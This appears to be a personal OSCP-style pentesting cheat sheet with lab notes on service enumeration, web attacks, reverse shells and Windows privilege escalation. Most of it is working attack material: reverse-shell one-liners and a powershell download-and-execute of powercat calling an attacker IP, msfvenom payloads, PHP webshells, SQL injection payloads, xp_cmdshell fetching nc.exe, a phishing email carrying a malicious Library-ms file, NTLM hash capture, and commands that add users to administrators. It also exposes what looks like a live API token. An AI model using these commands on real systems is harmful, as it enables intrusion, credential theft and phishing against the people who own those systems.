# Use https-post-form mode for https, post or get can be obtained from Burpsuite. Also do capture the response for detailed info.

#Bruteforce can also be done by Burpsuite but it's slow, prefer Hydra!
```

- if `cgi-bin` is present then do further fuzzing and obtain files like .sh or .pl
- Check if other services like FTP/SMB or anyothers which has upload privileges are getting reflected on web.
- API - Fuzz further and it can reveal some sensitive information

```powershell
#WFUZZ
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 "http://192.168.104.187/FUZZ" # Foders uploads, data
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt  --hc 404 "http://192.168.104.187/FUZZ" # Files like .htaccess
#identifying endpoints using gobuster
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern #pattern can be like {GOBUSTER}/v1 here v1 is just for example, it can be anything
gobuster dir -u http://192.168.162.143/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt # It has big list

#feroxbuster
feroxbuster --url HTTP://1.2.3.4/
feroxbuster --url https://ms01.oscp.exam:8443 --insecure
feroxbuster --url https://ms01.oscp.exam:8443 --insecure --filter-status 404

#obtaining info using curl
curl -i http://192.168.50.16:5002/users/v1
```

- If there is any Input field check for **Remote Code execution** or **SQL Injection**
- Check the URL, whether we can leverage **Local or Remote File Inclusion**.
- Also check if there’s any file upload utility(also obtain the location it’s getting reflected)

### Wordpress

```powershell
# basic usage
wpscan --url "target" --verbose

# enumerate vulnerable plugins, users, vulrenable themes, timthumbs
wpscan --url "target" --enumerate vp,u,vt,tt --follow-redirection --verbose --log target.log

# Add Wpscan API to get the details of vulnerabilties.
wpscan --url http://alvida-eatery.org/ --api-token NjnoSGZkuWDve0fDjmmnUNb1ZnkRw6J2J1FvBsVLPkA 

#Accessing Wordpress shell
http://10.10.67.245/retro/wp-admin/theme-editor.php?file=404.php&theme=90s-retro

http://10.10.67.245/retro/wp-content/themes/90s-retro/404.php
```

### Drupal

```bash
droopescan scan drupal -u http://site
```

### Joomla

```bash
droopescan scan joomla --url http://site
sudo python3 joomla-brute.py -u http://site/ -w passwords.txt -usr username #https://github.com/ajnik/joomla-bruteforce 
```

## DNS enumeration

- Better use `Seclists` wordlists for better enumeration. [https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS](https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS)

```powershell
host www.megacorpone.com
host -t mx megacorpone.com
host -t txt megacorpone.com

for ip in $(cat list.txt); do host $ip.megacorpone.com; done #DNS Bruteforce
for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found" #bash bruteforcer to find domain name

## DNS Recon
dnsrecon -d megacorpone.com -t std #standard recon
dnsrecon -d megacorpone.com -D ~/list.txt -t brt #bruteforce, hence we provided list

# DNS Bruteforce using dnsenum
dnsenum megacorpone.com

## NSlookup, a gold mine
nslookup mail.megacorptwo.com
nslookup -type=TXT info.megacorptwo.com 192.168.50.151 #We are querying the information from a specific IP, here it is 192.168.50.151. This can be very useful
```

## SMTP enumeration

```powershell
nc -nv <IP> 25 #Version Detection
smtp-user-enum -M VRFY -U username.txt -t <IP> # -M means mode, it can be RCPT, VRFY, EXPN

#Sending emain with valid credentials, the below is an example for Phishing mail attack
sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
```
### SMTP - swaks Phishing mail
- Start the webdav server first before creating the config file
- Open the VisualStudio code open new text file paste below code (Enter KALI IP) save it.
- Double click to open the file(config file, created in above) include same config file.
- Include powershell shortcut(On Desktop RightClick -> New -> Shortcut -> (in open location place Include below powershell powercat download execute command), save it powershell). # Putcorrect IP address
- Now this folder has config file and powershell shortcut.
- Transfer this file to kali using ssh command below. 
```powershell
## config.Library-ms file start -----------------------
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.247</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
##config.Library-ms file end ----------------------------

##copythis config.Library-ms into kali working directory
>/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/(#Customize this path) 
>sudo service ssh start
>scp .\config.Library-ms kali@192.168.45.242:/home/kali/Desktop/HTB/OSCP/AD/beyond/
#Inter below command on windows shortcut name itinstall
>powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.224:8000/powercat.ps1'); powercat -c 192.168.45.224 -p 4444 -e powershell"
>nc -nlvp 4444
>sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach config.Library-ms --server 192.168.208.242 --body body.txt --header "Subject: Staging Script" --suppress-data -ap
nc -nlvp 4444>whoami
>hostname
>ipconfig # check IP Address
```
## Finger 79 Enumeration
In computer networking, the Name/Finger protocol and the Finger user information protocol are simple network protocols for the exchange of human-oriented data.
- Identifying the users
- Script from [PenetestMonkey](https://pentestmonkey.net/tools/user-enumeration/finger-user-enum) commands from hacktriks
```powershell
./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 192.168.104.140 | grep -v 'is not known at this site' # Filter based on the output
# Iamp commands from the Hepet PG Practice
```
## LDAP Enumeration
- If want login with ldap ports 389, 636, 3268, 3269 anonymously login get details like usernames and passwords

```powershell
# ldap Aonnymous login ports 389, 636, 3268, 3269 hutch PG Practice
ldapsearch -x -H ldap://192.168.104.122 -D '' -w '' -b "DC=hutch,DC=offsec"
nxc ldap 192.168.104.122 -u '' -p '' -M get-desc-users # Get users information if it has anonymous login


ldapsearch -x -H ldap://<IP>:<port> # try on both ldap and ldaps, this is first command to run if you dont have any valid credentials.

ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
#CN name describes the info w're collecting
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"

#windapsearch.py [windapsearch](https://github.com/ropnop/windapsearch)
#Windapsearch full information (Save information in file, then search pwd keyword passwords might be their)
./windapsearch.py -U --full --dc-ip 10.10.10.182
#For Description and passwords
./windapsearch.py --dc-ip 10.10.10.169 -d resolute.megabank.local -U --full | grep Password (#Make sure capital "P")
#for computers
python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --computers

#for groups
python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --groups

#for users
python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --da

#for privileged users
python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --privileged-users
```

## NFS Enumeration

```powershell
nmap -sV --script=nfs-showmount <IP>
showmount -e <IP>
```

## SNMP Enumeration
- ENumeration from [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp)
- Similar machine faced OSCP Challenge labs, OSCPB Kiero(.149) use discord challnel

```powershell
#Nmap UDP scan
sudo nmap <IP> -A -T4 -p- -sU -v -oN nmap-udpscan.txt
snmpwalk -c public -v1 192.168.171.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
#NET-SNMP-EXTEND-MIB::nsExtendCommand."RESET" = STRING: ./home/john/RESET_PASSWD
#NET-SNMP-EXTEND-MIB::nsExtendOutLine."RESET".1 = STRING: Resetting password of kiero to the default value
#It states that John is the user, the machine has 21, 22 and 80 open. I tried ssh, but I did not luck, I tried FTP and got the id_rsa keys.

snmpcheck -t <IP> -c public #Better version than snmpwalk as it displays more user friendly

snmpwalk -c public -v1 -t 10 <IP> #Displays entire MIB tree, MIB Means Management Information Base
snmpwalk -c public -v1 <IP> 1.3.6.1.4.1.77.1.2.25 #Windows User enumeration
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.4.2.1.2 #Windows Processes enumeration
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.6.3.1.2 #Installed software enumeraion
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.6.13.1.3 #Opened TCP Ports

#Windows MIB values
1.3.6.1.2.1.25.1.6.0 - System Processes
1.3.6.1.2.1.25.4.2.1.2 - Running Programs
1.3.6.1.2.1.25.4.2.1.4 - Processes Path
1.3.6.1.2.1.25.2.3.1.4 - Storage Units
1.3.6.1.2.1.25.6.3.1.2 - Software Name
1.3.6.1.4.1.77.1.2.25 - User Accounts
1.3.6.1.2.1.6.13.1.3 - TCP Local Ports
```

## RPC Enumeration
- Create a user using rpcclient

```powershell
rpcclient -U=user $IP
rpcclient -U="" $IP #Anonymous login
##Commands within in RPCclient
srvinfo
enumdomusers #users
enumpriv #like "whoami /priv"
queryuser <user> #detailed user info
getuserdompwinfo <RID> #password policy, get user-RID from previous command
lookupnames <user> #SID of specified user
createdomuser <username> #Creating a user
deletedomuser <username>
enumdomains
enumdomgroups
querygroup <group-RID> #get rid from previous command
querydispinfo #description of all users
netshareenum #Share enumeration, this only comesup if the current user we're logged in has permissions
netshareenumall
lsaenumsid #SID of all users
# Create user using rpcclient
rpcclient -U support 10.10.10.192 (Blackfield - HackTheBox)
rpcclient $> setuserinfo2 audit2020 23 ashok
result: NT_STATUS_PASSWORD_RESTRICTION
result was NT_STATUS_PASSWORD_RESTRICTION
#Error with the Password policy not match
rpcclient $> setuserinfo2 audit2020 23 'Ashok@123'
rpcclient $>
# Password created successful
```

### Windows conpty shell
- In windows we can interactive have reverse shell with autocomplete features using the [ConPtyShell](https://github.com/antonioCoco/ConPtyShell)
- If you have the Windows recode code execution in the browser so we can get a fully interactive shell [Hutch PG Pracice](https://www.youtube.com/watch?v=yI6nN8o3YUY)

```powershell
# Windows cmd shell in path "put /usr/share/webshells/aspx/cmdasp.aspx"
# Kali Linux
stty raw -echo; (stty size; cat) | nc -lvnp 80 #interactive shell with auto complete 
# Windows shell
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <KALI-IP> 3001
powershell IEX(IWR http://192.168.45.227:8080/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.45.227 80 #target don't have NET access, share through kali box
```

### SMB getting hash & Windows AD full permission GpoEditDeleteModifySecurity  
- In windows smb port is open able insert a files, except that, their is clue to find with ldap, rpcclient, UDP snmp, ntp
- In the SMB upload .url file to get the current logged in user hash on the target.
- Vault Box PGPractice
```powershell
cat ashok.url 
[InternetShortcut]
URL=anything
WorkingDirectory=anything
IconFile=\\192.168.45.214\%USERNAME%.icon
IconIndex=1
# cat file end, here Kali Linux IP, Username find windows username
sudo responder -I tun0 -v # This case got anirudh hash
whoami /all
# It SeBackupPrivilege enabled dumped sam and system file got the admin hash but not able to login with winrm even tried with smb.
Import-Module .\PowerView.ps1 # Create temp directory copy the powershell here
Get-GPO -Name "Default Domain Policy" # Get the Id from the output then we can the user privileges with that is
Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName anirudh # anirudh identified permission GpoEditDeleteModifySecurity
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
gpupdate /force # Must update the policies after changing
net user anirudh # Boom user added into local admin group, loginwith impacket-psexec with anirudh user,you will admin privileges 
``` 
---

# Web Attacks

<aside>
💡 Cross-platform PHP revershell: [https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)

</aside>

## Curl HTTP requests login with while command
- I have a situation want login from curl with credentials

```powershell
http://offsec:elite@livda:242/simple-backdoor.php?cmd=whoami+/priv # Login with curl
curl --data-urlencode "cmd=dir /a" http://offsec:elite@livda:242/simple-backdoor.php # Curl encode URL
curl --data-urlencode "cmd=dir C:\\" http://offsec:elite@livda:242/simple-backdoor.php # Check in C drive
# If ZSH is not working then Some time try with /bin/bash
while true; do read  "? > " cmd; [ "$cmd" = "exit" ] && break; eval "curl --data-urlencode cmd=$cmd http://offsec:elite@192.168.104.46:242/simple-backdoor.php"; done;
while true; do read  "? > " cmd; [ "$cmd" = "exit" ] && break; eval "curl --data-urlencode 'cmd=$cmd' http://offsec:elite@192.168.104.46:242/simple-backdoor.php"; done;
```

- Basic Request: You can use the command below to make a basic request to a website.

```powershell
curl https://curl.ctfio.com
```


- Choosing a Path: If you wish to view a different website path, you can use the command below.

```powershell
curl https://curl.ctfio.com/endpoint_1
```


- Query Strings: As we learned earlier in the module, arguments can be passed to a web application using query strings. You can try this using the command below.

```powershell
curl https://curl.ctfio.com/endpoint_2?show=flag 
```


- Method Type: In this example, the application only supports the POST method. You can change your method by using the -X switch.

```powershell
curl -X POST https://curl.ctfio.com/endpoint_3
```


- Post Data: Expanding on the above example, we can send data to the web application using the -d switch.
```powershell
curl -X POST https://curl.ctfio.com/endpoint_4 -d "show=flag"
```


- Headers: You can set headers can be achieved by using the -H switch.
```powershell
curl https://curl.ctfio.com/endpoint_5 -H "Show: flag"
```


 - Cookies: You can set cookies using two different methods; as cookies are technically a header, you can use something similar to the above example:
```powershell
curl https://curl.ctfio.com/endpoint_5 -H "Cookie: show=flag"
```

- Or by using the proper -b switch that curl reserves for setting cookies.
```powershell
curl https://curl.ctfio.com/endpoint_6 -b "show=flag"
```


- URL Encoding: Some characters in requests are reserved for letting the web server know where data starts and ends, such as the & and = characters. 

- For example, if you wanted to set the field show to have the value fl&ag, this would confuse the webserver as it would think show has the value fl, and then the & character is signifying the start of the next field. 

- You can circumvent this by URL encoding special characters. This looks like a percent sign (%) followed by two hexadecimal digits, and these digits represent the character's value in the ASCII character set (https://www.w3schools.com/charsets/ref_html_ascii.asp).

- So to properly make the request, we'd use the example below.
```powershell
curl https://curl.ctfio.com/endpoint_7?show=fl%26ag
```


- Authorization: Websites that require authorization can have a username and password passed to them in two methods, either by using the -u switch:
```powershell
curl -u admin:password https://curl.ctfio.com/endpoint_8
```


 - Or by using the Authorization header. In this example, the username and password is concatenated together using a colon and then encoded using base64.
```powershell
curl https://curl.ctfio.com/endpoint_8 -H "Authorization: Basic YWRtaW46cGFzc3dvcmQ="
```


## Directory Traversal

```powershell
cat /etc/passwd #displaying content through absolute path
cat ../../../etc/passwd #relative path

# if the pwd is /var/log/ then in order to view the /etc/passwd it will be like this
cat ../../etc/passwd

#In web int should be exploited like this, find a parameters and test it out
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
#check for id_rsa, id_ecdsa
#If the output is not getting formatted properly then,
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd 

#For windows
http://192.168.221.193:3000/public/plugins/alertlist/../../../../../../../../Users/install.txt #no need to provide drive
```

- URL Encoding

```powershell
#Sometimes it doesn't show if we try path, then we need to encode them
curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

- Wordpress
    - Simple exploit: https://github.com/leonjza/wordpress-shell

## Local File Inclusion, File Uploads

- Main difference between Directory traversal and this attack is, here we’re able to execute commands remotely.

```powershell
#Cheching .htaccess, Upload this file and check whether it's accepting or not.
cat .htaccess              
#AddType application/x-httpd-php .evil, After accepting this run wfuzz for folders and files check is their any path user uploaded files.
# Above we are allowing the .evil extension, So we can upload the files .evil extension
cat ashok.evil 
<pre>
<?php
system($_GET['cmd']);
?>
</pre>

#At first we need 
http://192.168.45.125/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami #we're passing a command here

#Reverse shells
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
#We can simply pass a reverse shell to the cmd parameter and obtain reverse-shell
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22 #encoded version of above reverse-shell

#PHP wrapper
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>" 
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php 
```

- Remote file inclusion

```powershell
1. Obtain a php shell
2. host a file server 
3.
http://mountaindesserts.com/meteor/index.php?page=http://attacker-ip/simple-backdoor.php&cmd=ls
we can also host a php reverseshell and obtain shell.
```

## SQL Injection

```powershell
admin' or '1'='1
' or '1'='1
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 -
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1-
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1`='1-
```

- Blind SQL Injection - This can be identified by Time-based SQLI

```powershell
#Application takes some time to reload, here it is 3 seconds
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```

### Manual Code Execution sql

```powershell
kali> impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth #To login
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
#Now we can run commands
EXECUTE xp_cmdshell 'whoami';

#After successfully partial command shell observe the commands with syntax both are the same caution to use EXECUTE or powershell -c
EXECUTE xp_cmdshell 'whoami';
xp_cmdshell powershell -c whoami;

#Download the file
xp_cmdshell powershell -c iwr -uri http://10.10.153.147:7777/nc.exe -Outfile C:\Users\Public\nc.exe
xp_cmdshell powershell -c C:\Users\Public\nc.exe 10.10.153.147 8888 -e cmd
#END

#MSSQL
netexec mssql 10.10.125.148 -u sql_svc -p Dolphin1 -q 'EXEC xp_cmdshell "whoami" '
#END

#Sometimes we may not have direct access to convert it to RCE from web, then follow below steps
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- // #Writing into a new file
#Now we can exploit it
http://192.168.45.285/tmp/webshell.php?cmd=id #Command execution

#Load the file with sql command [craft2 PG practice](https://www.youtube.com/watch?v=-Y4yrwNx8ww) at 1 hour 10 minutes
select LOAD_FILE("/Users/Administrator/Desktop/proof.txt") INTO DUMPFILE "C:/temp/proof.txt"; 
```

### SQLMap - Automated Code execution

```powershell
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user #Testing on parameter names "user", we'll get confirmation
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump #Dumping database

#OS Shell
#  Obtain the Post request from Burp suite and save it to post.txt
sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp" #/var/www/html/tmp is the writable folder on target, hence we're writing there

```

### MSSQL creds from .xlsm file MS Excel macro & Secure Web Browser
- I had a situation, where smb, mssql ports open, not creds to login with SQL, so dig into smb found that .xlsm so it is microsoft execl macro.
- To open that file we need a oletools
- Reference HTB - Querier, another [article](https://medium.com/@PenSunset/querier-hackthebox-walkthrough-c6baf9df0d14)
- Reference Pg Pracrice - Heist Secure Web Browser, through responder got hash.
```powershell
#install oletools, Already their a pyhton virtual environment in my machine at (source /home/kali/HTB/HTB/Chaos/myenv/bin/activate).
pip install -U oletools
olevba Currency\ Volume\ Report.xlsm
impacket-mssqlclient reporting@10.10.10.125 -windows-auth #PAssword-PcwTWTHRwryjc$c6
#From this shell <b> don't have the xp_cmdshell</b>, try to Steal NetNTLM hash / Relay attack using xp_dirtree command tries to ping the smb of kali machine, 
exec xp_dirtree "\\10.10.14.12\ashok\"
sudo responder -I tun0 # this will catch the NTLM hash, this case got mssql-svc user save the hash in text file crack with either john or hashcat tool.
john hash -w=/home/kali/HTB/OSCP/rockyou.txt  
#with hashcat
Hashcat -m 5600 hash /home/kali/HTB/OSCP/rockyou.txt  

```

---

# Exploitation

## Finding Exploits

### Searchsploit

```bash
searchsploit <name>
searchsploit -m windows/remote/46697.py #Copies the exploit to the current location
```

## Reverse Shells

### Msfvenom

```powershell
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe

msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php

# Between string is bad character, no need to mention - for LHOST and LPORT
#reference is kevin PGPractice - https://www.youtube.com/watch?v=9h8BSFsL7wk
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.227 LPORT=80 -f c -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" -e x86/alpha_mixed
```

### One Liners
- From [RevShells](https://www.revshells.com/)
```powershell
sh -i >& /dev/tcp/192.168.45.220/4455 0>&1 
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
<?php echo shell_exec('bash -i >& /dev/tcp/10.11.0.106/443 0>&1');?>
#For powershell use the encrypted tool that's in Tools folder
```

<aside>
💡 While dealing with PHP reverseshell use: [https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)

</aside>

### Groovy reverse-shell Jenkins

- For Jenkins, manage > script console

```powershell
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

---

# Windows Privilege Escalation

<aside>
💡 `cd C:\ & findstr /SI /M "OS{" *.xml *.ini *.txt` - for finding files which contain OSCP flag..

</aside>

## Windows Privilege Escalation -TCM Security
- Executable winPEAS.exe, compile Seatbelt.exe, Watson.exe, SharpUp.exe
- Powershell Sherlock.ps1, PowerUp.ps1, Jaws-enum.ps1
- Other Windows-Exploit-Suggester.py, Exploit Suggester(Metasploit)
- Windows  kernel [Exploits](https://github.com/SecWiki/windows-kernel-exploits), 
```powershell
# System information based on system version and bit we can find/create a kernel exploit
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic qfe # Patch update some systems don't work
wmic logicaldisk get caption,description,providername #logical disk information

# Users and groups
whoami /priv #User privileges
whoami /groups # Show you groups
net user
net user <users>
net localgroup
net localgroup administrators

# Network administrator
ipconfig
ipconfig /all
arp -a
route print

# Ports
netstat -ano

# Password hunting
findstr /si password *.txt, *.ini, *.config

# Firewall and Antivirus Enumeration
sc query windefend
sc queryex type= service
netsh advfilewall firewall dump
netsh firewall show state
netsh firewall show config


#Stored Password
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# Windows Sub Syetm For Linux (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
where /R c:\windows wsl.exe
where /R c:\windows bash.exe
# Find the path of wsl and bash
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe whoami # Will get root
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
hostname # You will get name of the host, check for bash history

# Runas process here https://ashokreddyz.medium.com/access-hackthebox-windows-privileges-escalation-046aed801fb6
cmdkey /list

# Escalation with Registry
Autoruns64.exe #SysInternal tools

# Registry Escalation - AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer # If it's set to 1 or 0x1 then AlwaysInstallElevated ON
# Other way
powershell.exe -exec bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks
# in this sectionAlwaysInstallElevated registry Key
AbuseFunction: Write-UserAddMSI #It will create .msi, execute check the users in admin group

# Service Escalation - Registry,
# Service escation dealing with registry, if have full control over the registry key, we can do compile malicious executable written c, 
#-in the add a user, in compile file and then done.
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
# Check if have NT Authority\INTERACTIVE Allow FullControl acces permission then continue the process
cmd.exe /k net localgroup administrators user /add # Repalce with this "whoami > c:\\windows\\temp\\service.txt",  It will add user in admin group
# this file https://raw.githubusercontent.com/sagishahar/scripts/refs/heads/master/windows_service.c,
x86_64-w64-mingw32-gcc windows_service.c -o x.exe (NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64')
net localgroup administrators
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
sc start regsvc
#It will create start file
net localgroup administrators


# Service Escalation - Executable Files
Powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
#Check if have any executable permission to file, also check with accesschk64.exe
accesschk64.exe -wvu “PATH”
# If you have RW Everyone with FILE_ALL_SYSTEM
# Then replace the file
sc start "Name of The Service" # You'll get in powerup.ps1, Invoke-AllChecks command.


# Escalation Path - Startup Applications
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
# From the output notice that the “BUILTIN\Users” group has full access ‘(F)’ to the directory.
msfvenom -p windows/shell_reverse_tcp LHOST=10.6.17.98 LPORT=443 -f exe -o program.exe
#Put file on the path, start the service, restart the system or switch the user
# You will get a user


# Escalation Path - DLL Hijacking
https://www.udemy.com/course/draft/2994784/learn/lecture/19449784#questions/16528788,

# Escalation Path – Unquoted Service Permissions
#Look for checking service permissions
Powershell -ep bypass
. .\PowerUp.ps1
All-AllChecks
#Also check with
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
#output suggests that the user “User-PC\User” has the “SERVICE_CHANGE_CONFIG” permission.
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc Everyone *
Sc qc daclsvc
net localgroup administrators
sc config daclsvc binpath= "net localgroup administrators user /add" # Here computer username will be user
sc qc daclsvc
sc start daclsvc
net localgroup administrators # the uer added into the administrators group.

# Escalation Path – Unquoted Service Permissions
Powershell -ep bypass
. .\PowerUp.ps1
All-AllChecks
#Look for Unquoted Service Paths, Also check for service name
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators user /add" -f exe > Common.exe
msfvenom -p windows/exec CMD=’C:\Users\user\Desktop\nc.exe 10.6.17.98 443 -e cmd.exe’ -f exe-service -o common.exe
net localgroup administrators
sc start unquotedsvc
net localgroup administrators

# Escalation Path – Hot Potato
Powershell -ep bypass
Import-Module .\Tater.ps1
net localgroup administrators
Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
#It will take some time to add
net localgroup administrators

# SeImpersonatePrivileges Juice potato - https://github.com/ohpe/juicy-potato/releases
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.12 LPORT=80 -a x64 --platform Windows -f exe -o shell.exe
C:\temp\JuicyPotato.exe -t * -p C:\temp\shell.exe -l 443
rlwrap -nlvp 80 #Since port in 443 but listen on port 80 msfvenom created on it

```

## Manual Enumeration commands

```bash
#Groups we're part of
whoami /groups

whoami /all #lists everything we own.

#Starting, Restarting and Stopping services in Powershell
Start-Service <service>
Stop-Service <service>
Restart-Service <service>

#Powershell History
Get-History
